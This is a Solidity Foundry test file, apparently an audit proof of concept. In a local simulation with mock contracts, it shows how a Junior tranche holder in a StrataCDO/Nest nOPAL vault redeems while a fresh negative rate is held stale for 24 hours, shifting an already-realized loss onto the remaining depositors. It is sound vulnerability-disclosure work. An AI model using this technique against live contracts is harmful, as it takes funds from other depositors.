// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {AccessControlManager} from "../../contracts/governance/AccessControlManager.sol";
import {StrataCDO} from "../../contracts/tranches/StrataCDO.sol";
import {Tranche} from "../../contracts/tranches/Tranche.sol";
import {DYSAccounting} from "../../contracts/tranches/DYSAccounting.sol";
import {AprPairFeed} from "../../contracts/tranches/oracles/AprPairFeed.sol";
import {NestOpalStrategy} from "../../contracts/tranches/strategies/nest/NestOpalStrategy.sol";
import {NestAccountantAprProvider} from "../../contracts/tranches/strategies/nest/NestAccountantAprProvider.sol";
import {INestAccountant, IAprSnapshotProvider} from "../../contracts/tranches/strategies/nest/interfaces/INestContracts.sol";
import {ERC20Cooldown} from "../../contracts/tranches/base/cooldown/ERC20Cooldown.sol";
import {SharesCooldown} from "../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {CooldownBase} from "../../contracts/tranches/base/cooldown/CooldownBase.sol";
import {IERC20Cooldown} from "../../contracts/tranches/interfaces/cooldown/ICooldown.sol";
import {ISharesCooldown} from "../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import {IAprPairFeed} from "../../contracts/tranches/interfaces/IAprPairFeed.sol";
import {IAccounting} from "../../contracts/tranches/interfaces/IAccounting.sol";
import {IStrategy} from "../../contracts/tranches/interfaces/IStrategy.sol";
import {ITranche} from "../../contracts/tranches/interfaces/ITranche.sol";
import {IStrataCDO} from "../../contracts/tranches/interfaces/IStrataCDO.sol";
import {UD60x18} from "@prb/math/src/ud60x18/ValueType.sol";

import {MockNestAccountant} from "../../contracts/test/nest/MockNestContracts.sol";
import {MockNOpal} from "../../contracts/test/nest/MockNestOpalContracts.sol";
import {MockERC20} from "../../contracts/test/MockERC20.sol";

/// @notice Candidate PoC: a fresh negative Nest rate is held stale by DYS for 24h,
///         while meta-token redemption converts the stale USDC claim at the lower live nOPAL rate.
///         The first Junior redeemer therefore avoids their pro-rata share of an already-realized loss.
contract NestOpalDYSStaleLossPoC is Test {
    bytes32 constant UPDATER_STRAT_CONFIG_ROLE = keccak256("UPDATER_STRAT_CONFIG_ROLE");
    bytes32 constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    bytes32 constant COOLDOWN_WORKER_ROLE = keccak256("COOLDOWN_WORKER_ROLE");

    uint256 constant ONE = 1e6;
    uint256 constant RATE_0 = 1_000_000;
    uint256 constant RATE_1 = 999_500;
    uint256 constant RATE_1_UNIT = 999_999;

    address owner;
    address attacker;
    address victim;
    address senior;

    MockERC20 usdc;
    MockNOpal nOpal;
    MockNestAccountant nestAccountant;

    AccessControlManager acm;
    StrataCDO cdo;
    Tranche jrtVault;
    Tranche srtVault;
    ERC20Cooldown erc20Cooldown;
    SharesCooldown sharesCooldown;
    NestOpalStrategy strategy;
    NestAccountantAprProvider aprProvider;
    AprPairFeed feed;
    DYSAccounting accounting;

    uint256 attackerShares;
    uint256 victimShares;

    struct Outcome {
        uint256 attackerNOpalOut;
        uint256 attackerValueAtLossRate;
        uint256 victimBaseValue;
        uint256 savedJrtNav;
        uint256 strategyLiveNav;
        uint256 reserveNav;
    }

    function setUp() public {
        vm.warp(20 days);

        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        senior = makeAddr("senior");

        vm.startPrank(owner);

        usdc = new MockERC20("USDC", 6);
        nOpal = new MockNOpal();
        nestAccountant = new MockNestAccountant(address(usdc), RATE_0);

        acm = new AccessControlManager(owner);

        StrataCDO cdoImpl = new StrataCDO(IERC20Metadata(address(usdc)));
        cdo = StrataCDO(address(new ERC1967Proxy(
            address(cdoImpl),
            abi.encodeWithSelector(StrataCDO.initialize.selector, owner, address(acm))
        )));

        jrtVault = _deployTranche("Junior nOPAL", "jrnOPAL");
        srtVault = _deployTranche("Senior nOPAL", "srnOPAL");

        ERC20Cooldown cooldownImpl = new ERC20Cooldown();
        erc20Cooldown = ERC20Cooldown(address(new ERC1967Proxy(
            address(cooldownImpl),
            abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
        )));

        NestOpalStrategy strategyImpl = new NestOpalStrategy(
            IERC20(address(nOpal)),
            IERC20(address(usdc)),
            INestAccountant(address(nestAccountant))
        );
        strategy = NestOpalStrategy(address(new ERC1967Proxy(
            address(strategyImpl),
            abi.encodeWithSelector(
                NestOpalStrategy.initialize.selector,
                owner,
                address(acm),
                IStrataCDO(address(cdo)),
                IERC20Cooldown(address(erc20Cooldown))
            )
        )));

        NestAccountantAprProvider.TRound[10] memory rounds;
        for (uint256 i = 0; i < 10; i++) {
            rounds[i] = NestAccountantAprProvider.TRound({
                answer: uint96(RATE_0),
                updatedAt: uint64(block.timestamp - (9 - i) * 1 days)
            });
        }
        aprProvider = new NestAccountantAprProvider(
            INestAccountant(address(nestAccountant)),
            rounds
        );

        AprPairFeed feedImpl = new AprPairFeed();
        feed = AprPairFeed(address(new ERC1967Proxy(
            address(feedImpl),
            abi.encodeWithSelector(
                AprPairFeed.initialize.selector,
                owner,
                address(acm),
                aprProvider,
                1 days,
                "nOPAL CDO APR Pair"
            )
        )));

        DYSAccounting accountingImpl = new DYSAccounting(6, false, true, false, true, false);
        accounting = DYSAccounting(address(new ERC1967Proxy(
            address(accountingImpl),
            abi.encodeWithSelector(
                DYSAccounting.initialize.selector,
                owner,
                address(acm),
                IStrataCDO(address(cdo)),
                IAprPairFeed(address(feed))
            )
        )));

        SharesCooldown sharesCooldownImpl = new SharesCooldown();
        sharesCooldown = SharesCooldown(address(new ERC1967Proxy(
            address(sharesCooldownImpl),
            abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
        )));
        sharesCooldown.setTwoStepConfigManager(owner);
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown)));

        acm.grantRole(UPDATER_STRAT_CONFIG_ROLE, owner);
        acm.grantRole(PAUSER_ROLE, owner);
        acm.grantRole(COOLDOWN_WORKER_ROLE, address(strategy));
        acm.grantRole(COOLDOWN_WORKER_ROLE, address(cdo));

        cdo.configure(
            IAccounting(address(accounting)),
            IStrategy(address(strategy)),
            ITranche(address(jrtVault)),
            ITranche(address(srtVault))
        );

        ISharesCooldown.TExitUpperBounds memory jrtBounds = ISharesCooldown.TExitUpperBounds({
            p0: 150_000,
            p1: 300_000,
            r0: ISharesCooldown.TExitParams({feePpm: 0, sharesLock: uint32(28 days)}),
            r1: ISharesCooldown.TExitParams({feePpm: 750, sharesLock: uint32(14 days)}),
            r2: ISharesCooldown.TExitParams({feePpm: 1_500, sharesLock: 0})
        });
        ISharesCooldown.TExitUpperBounds memory srtBounds = ISharesCooldown.TExitUpperBounds({
            p0: 150_000,
            p1: 300_000,
            r0: ISharesCooldown.TExitParams({feePpm: 0, sharesLock: 0}),
            r1: ISharesCooldown.TExitParams({feePpm: 250, sharesLock: 0}),
            r2: ISharesCooldown.TExitParams({feePpm: 500, sharesLock: 0})
        });
        sharesCooldown.setVaultExitBounds(address(jrtVault), jrtBounds);
        sharesCooldown.setVaultExitBounds(address(srtVault), srtBounds);

        cdo.setActionStates(address(jrtVault), true, true);
        cdo.setActionStates(address(srtVault), true, true);

        accounting.setMinimumJrtSrtRatioBuffer(0.08e18);
        accounting.setMinimumJrtSrtRatio(0.075e18);
        accounting.setFeeRetentionBps(0.5e18, 0.5e18);
        accounting.setReserveBps(0.05e18);
        accounting.setRiskParameters(
            UD60x18.wrap(0.125e18),
            UD60x18.wrap(0.125e18),
            UD60x18.wrap(0.3e18)
        );

        strategy.setAprProvider(IAprSnapshotProvider(address(aprProvider)));
        assertEq(strategy.nOpalCooldownJrt(), 0, "production JRT strategy cooldown default");
        assertEq(strategy.nOpalCooldownSrt(), 0, "production SRT strategy cooldown default");
        vm.stopPrank();

        nOpal.mint(attacker, 300 * ONE);
        nOpal.mint(victim, 100 * ONE);
        nOpal.mint(senior, 1000 * ONE);

        attackerShares = _depositJrt(attacker, 300 * ONE);
        victimShares = _depositJrt(victim, 100 * ONE);
        _depositSrt(senior, 1000 * ONE);

        assertEq(accounting.jrtNav(), 400 * ONE, "initial JRT NAV");
        assertEq(accounting.srtNav(), 1000 * ONE, "initial SRT NAV");
        assertGt(cdo.coverage(), 300_000, "coverage must stay in >30% production no-share-lock tier");
        (IStrataCDO.TExitMode mode, uint256 exitFee, uint32 lockSeconds) =
            cdo.calculateExitMode(address(jrtVault), attacker);
        assertEq(uint256(mode), uint256(IStrataCDO.TExitMode.Fee), "production exit must be Fee mode");
        assertEq(exitFee, 0.0015e18, "production JRT fee must be 15 bps");
        assertEq(lockSeconds, 0, "production >30% JRT tier has zero SharesLock");
    }

    function test_NegativeRateDelayLetsFirstJrtRedeemerExternalizeLoss() public {
        vm.warp(block.timestamp + 1 hours);
        nestAccountant.setExchangeRate(RATE_1);

        uint256 liveNavBefore = strategy.totalAssets();
        uint256 savedNavBefore = accounting.nav();
        uint256 anchor = accounting.lastReconciliation();

        assertEq(savedNavBefore, 1400 * ONE, "saved NAV baseline");
        assertEq(liveNavBefore, 1_399_300_000, "live strategy NAV reflects 0.05% loss");
        assertEq(
            strategy.totalAssets(savedNavBefore, anchor),
            savedNavBefore,
            "negative rate must be gated stale inside 24h"
        );

        uint256 snap = vm.snapshot();
        Outcome memory control = _redeemAfterLossIsRecognized();
        vm.revertTo(snap);
        Outcome memory attack = _redeemWhileLossIsHidden();

        uint256 attackerExtraValue = attack.attackerValueAtLossRate - control.attackerValueAtLossRate;
        uint256 victimExtraLoss = control.victimBaseValue - attack.victimBaseValue;
        uint256 reserveDelta = attack.reserveNav - control.reserveNav;
        uint256 nonAttackerLoss = victimExtraLoss - reserveDelta;

        console2.log("control attacker nOPAL", control.attackerNOpalOut);
        console2.log("attack attacker nOPAL", attack.attackerNOpalOut);
        console2.log("attacker excess live value (USDC 6d)", attackerExtraValue);
        console2.log("control victim value (USDC 6d)", control.victimBaseValue);
        console2.log("attack victim value (USDC 6d)", attack.victimBaseValue);
        console2.log("victim incremental loss (USDC 6d)", victimExtraLoss);
        console2.log("extra reserve retained in attack world (USDC 6d)", reserveDelta);
        console2.log("net non-attacker capital loss (USDC 6d)", nonAttackerLoss);

        assertGt(attack.attackerNOpalOut, control.attackerNOpalOut, "attacker must receive excess nOPAL");
        assertGt(attackerExtraValue, 0, "attacker must avoid realized loss");
        assertGt(victimExtraLoss, 0, "remaining JRT must absorb extra loss");
        assertApproxEqAbs(attackerExtraValue, nonAttackerLoss, 2, "attacker gain must be funded by remaining capital");
        assertApproxEqAbs(attackerExtraValue, 524_213, 5, "expected ~0.524213 USDC transfer");
    }

    function test_OnePpmNegativeRateStillExternalizesLoss() public {
        vm.warp(block.timestamp + 1 hours);
        nestAccountant.setExchangeRate(RATE_1_UNIT);

        uint256 anchor = accounting.lastReconciliation();
        assertTrue(
            aprProvider.isMeaningfulUpdate(uint96(RATE_1_UNIT), uint64(block.timestamp)),
            "1 ppm one-hour decrease must be meaningful"
        );
        assertTrue(aprProvider.isNegativeChange(uint96(RATE_1_UNIT)), "must be negative");
        assertEq(
            strategy.totalAssets(accounting.nav(), anchor),
            accounting.nav(),
            "1 ppm loss must also be gated stale inside 24h"
        );

        uint256 snap = vm.snapshot();
        Outcome memory control = _redeemAfterLossIsRecognized();
        vm.revertTo(snap);
        Outcome memory attack = _redeemWhileLossIsHidden();

        uint256 attackerExtraValue = attack.attackerValueAtLossRate - control.attackerValueAtLossRate;
        uint256 victimExtraLoss = control.victimBaseValue - attack.victimBaseValue;
        uint256 reserveDelta = attack.reserveNav - control.reserveNav;
        uint256 nonAttackerLoss = victimExtraLoss - reserveDelta;

        console2.log("1ppm attacker excess live value (USDC 6d)", attackerExtraValue);
        console2.log("1ppm victim incremental loss (USDC 6d)", victimExtraLoss);
        console2.log("1ppm reserve delta (USDC 6d)", reserveDelta);

        assertGt(attackerExtraValue, 0, "even a 1 ppm real-rate down-tick must benefit first redeemer");
        assertGt(victimExtraLoss, 0, "remaining JRT must absorb the tiny realized loss");
        assertApproxEqAbs(attackerExtraValue, nonAttackerLoss, 2, "1 ppm transfer must conserve value");
        assertApproxEqAbs(attackerExtraValue, 1_049, 2, "expected ~0.001049 USDC transfer");
    }

    function _redeemAfterLossIsRecognized() internal returns (Outcome memory out) {
        vm.warp(accounting.lastReconciliation() + 24 hours + 1);

        uint256 beforeBal = nOpal.balanceOf(attacker);
        vm.prank(attacker);
        uint256 tokenOut = jrtVault.redeem(address(nOpal), attackerShares, attacker, attacker);
        assertEq(nOpal.balanceOf(attacker) - beforeBal, tokenOut, "control direct token receipt");

        out.attackerNOpalOut = tokenOut;
        out.attackerValueAtLossRate = tokenOut * nestAccountant.exchangeRate() / ONE;
        out.victimBaseValue = jrtVault.convertToAssets(victimShares);
        out.savedJrtNav = accounting.jrtNav();
        out.strategyLiveNav = strategy.totalAssets();
        out.reserveNav = accounting.reserveNav();
    }

    function _redeemWhileLossIsHidden() internal returns (Outcome memory out) {
        uint256 beforeBal = nOpal.balanceOf(attacker);
        vm.prank(attacker);
        uint256 tokenOut = jrtVault.redeem(address(nOpal), attackerShares, attacker, attacker);
        assertEq(nOpal.balanceOf(attacker) - beforeBal, tokenOut, "attack direct token receipt");

        out.attackerNOpalOut = tokenOut;
        out.attackerValueAtLossRate = tokenOut * nestAccountant.exchangeRate() / ONE;
        out.victimBaseValue = jrtVault.convertToAssets(victimShares);
        out.savedJrtNav = accounting.jrtNav();
        out.strategyLiveNav = strategy.totalAssets();
        out.reserveNav = accounting.reserveNav();
    }

    function _deployTranche(string memory name, string memory symbol) internal returns (Tranche) {
        Tranche impl = new Tranche(false);
        return Tranche(address(new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(
                Tranche.initialize.selector,
                owner,
                address(acm),
                name,
                symbol,
                IERC20(address(usdc)),
                IStrataCDO(address(cdo))
            )
        )));
    }

    function _depositJrt(address user, uint256 amount) internal returns (uint256 shares) {
        vm.startPrank(user);
        nOpal.approve(address(jrtVault), amount);
        shares = jrtVault.deposit(address(nOpal), amount, user);
        vm.stopPrank();
    }

    function _depositSrt(address user, uint256 amount) internal returns (uint256 shares) {
        vm.startPrank(user);
        nOpal.approve(address(srtVault), amount);
        shares = srtVault.deposit(address(nOpal), amount, user);
        vm.stopPrank();
    }
}
